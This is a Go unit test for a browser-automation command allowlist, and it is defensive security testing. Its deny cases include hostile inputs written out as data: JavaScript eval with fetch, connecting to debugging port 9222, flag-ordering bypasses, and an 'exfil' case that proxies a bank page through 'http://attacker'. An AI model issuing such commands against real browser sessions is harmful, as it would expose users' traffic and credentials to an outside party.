package main

import "testing"

func TestAllowlist(t *testing.T) {
	cases := []struct {
		args []string
		ok   bool
	}{
		{[]string{"open", "https://example.com"}, true},
		{[]string{"snapshot"}, true},
		// --executable-path is now a denied (unknown) flag — orchestrator injects it server-side:
		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "open", "https://x"}, false},
		{[]string{"--executable-path", "/usr/local/bin/chromium-ns", "--state", "/p.enc", "open", "https://x"}, false},
		{[]string{"click", "@e1"}, true},
		{[]string{"get", "text", "body"}, true},
		// bypass vectors that MUST be denied:
		{[]string{"--executable-path", "open", "eval", "x"}, false},
		{[]string{"--flag", "snapshot", "connect"}, false}, // unknown flag --flag
		{[]string{"eval", "fetch('/x')"}, false},
		{[]string{"connect", "9222"}, false},
		{[]string{"get", "cdp-url"}, false},
		{[]string{}, false},
		// dangerous exfil flags — MUST be denied:
		{[]string{"--proxy", "http://attacker", "open", "https://bank"}, false},
		{[]string{"--headers", "{}", "open", "https://x"}, false},
		// benign value flag and plain verbs:
		{[]string{"--timeout", "5000", "snapshot"}, true},
		{[]string{"open", "https://x"}, true},
	}
	for _, c := range cases {
		if got := ExecAllowed(c.args); got != c.ok {
			t.Errorf("ExecAllowed(%v) = %v, want %v", c.args, got, c.ok)
		}
	}
}
